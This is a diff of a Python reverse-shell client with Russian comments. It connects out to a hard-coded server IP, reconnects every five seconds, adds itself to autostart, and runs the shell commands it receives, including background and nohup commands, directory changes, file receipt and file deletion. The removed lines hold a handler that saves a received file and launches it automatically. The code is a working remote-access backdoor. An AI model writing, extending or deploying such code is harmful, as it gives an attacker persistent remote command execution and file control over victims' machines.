@@ -4,29 +4,36 @@ import os
 import sys
 import time
 
-SERVER_IP = "192.168.100.3"  # Замените на адрес вашего сервера
+SERVER_IP = "192.168.100.3"  # Установите ваш IP сервера
 SERVER_PORT = 5000
 BUFFER_SIZE = 4096
 
-
 def execute_command(command):
     try:
-        output = subprocess.getoutput(command)
-        return output
+        return subprocess.getoutput(command)
     except Exception as e:
         return f"Ошибка выполнения команды: {e}"
-
 
 def is_windows():
     return os.name == 'nt'
 
+# ... (автозагрузка и другие функции остались без изменений) ...
 
 def main():
+    try:
+        add_self_to_autostart()
+    except Exception as e:
+        print(f"Ошибка добавления в автозапуск: {e}")
+
+    current_dir = os.getcwd()
+
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             s.connect((SERVER_IP, SERVER_PORT))
+            print(f"[INFO] Подключились к серверу {SERVER_IP}:{SERVER_PORT}")
         except Exception:
+            print("[WARN] Не удалось подключиться к серверу. Пауза 5 секунд...")
             time.sleep(5)
             continue
 
@@ -41,52 +48,21 @@ def main():
                 if command == "exit":
                     break
 
-                # Обработка команды загрузки и одновременного запуска файла
-                if command.startswith("upload_and_run:"):
-                    filepath = command[len("upload_and_run:"):].strip()
-                    try:
-                        with open(filepath, "wb") as f:
-                            while True:
-                                chunk = s.recv(BUFFER_SIZE)
-                                if chunk == b"__file_transfer_end__" or not chunk:
-                                    break
-                                f.write(chunk)
-                        # После успешного сохранения запускаем скрипт автоматически
-                        subprocess.Popen(
-                            ['nohup', 'python3', filepath],
-                            stdout=subprocess.DEVNULL,
-                            stderr=subprocess.DEVNULL,
-                            shell=False,
-                        )
-                        s.send(f"Файл {os.path.basename(filepath)} получен и запущен.".encode())
-                    except Exception as e:
-                        s.send(f"Ошибка при сохранении/запуске файла: {e}".encode())
-                    continue
-
-                # Обработка проверки существования файла
-                if command.startswith("check_file_exists:"):
-                    filepath = command[len("check_file_exists:"):].strip()
-                    if os.path.isfile(filepath):
-                        s.send("exists".encode())
-                    else:
-                        s.send("not_exists".encode())
-                    continue
-
                 if command.startswith("cmd:"):
                     cmd = command[4:].strip()
 
+                    # Обработка nohup
                     if "nohup" in cmd:
                         try:
                             subprocess.Popen(cmd, shell=True,
                                              stdout=subprocess.DEVNULL,
                                              stderr=subprocess.DEVNULL)
-                            time.sleep(0.5)
-                            print("[DEBUG] Отправляю подтверждение запуска nohup команды")
                             s.send("Команда запущена через nohup".encode())
                         except Exception as e:
                             s.send(f"Ошибка запуска команды с nohup: {e}".encode())
                         continue
 
+                    # Запуск команд в фоне (&)
                     if cmd.endswith('&'):
                         cmd_no_amp = cmd.rstrip('&').strip()
                         try:
@@ -104,7 +80,8 @@ def main():
                             path = os.path.expanduser("~")
                         try:
                             os.chdir(path)
-                            s.send(f"Сменена директория на {os.getcwd()}".encode())
+                            current_dir = os.getcwd()
+                            s.send(f"Сменена директория на {current_dir}".encode())
                         except Exception as e:
                             s.send(f"Ошибка смены директории: {e}".encode())
 
@@ -190,9 +167,12 @@ def main():
                                 if chunk == b"__file_transfer_end__" or not chunk:
                                     break
                                 f.write(chunk)
-                        s.send(f"Файл {os.path.basename(filepath)} успешно получен.".encode())
+                        # Отправляем подтверждение успешного получения файла
+                        s.send(f"Файл {os.path.basename(filepath)} успешно получен.\n".encode())
+                        print(f"[INFO] Файл {filepath} успешно сохранён")
                     except Exception as e:
                         s.send(f"Ошибка при сохранении файла: {e}".encode())
+                        print(f"[ERROR] Ошибка при сохранении файла: {e}")
 
                 elif command.startswith("delete:"):
                     filepath = command[len("delete:"):].strip()
@@ -205,13 +185,12 @@ def main():
                 else:
                     s.send("Неизвестная команда".encode())
 
-        except Exception:
-            pass
+        except Exception as e:
+            print(f"[ERROR] Ошибка в основном цикле: {e}")
         finally:
             s.close()
 
         time.sleep(5)
-
 
 if __name__ == "__main__":
     main()
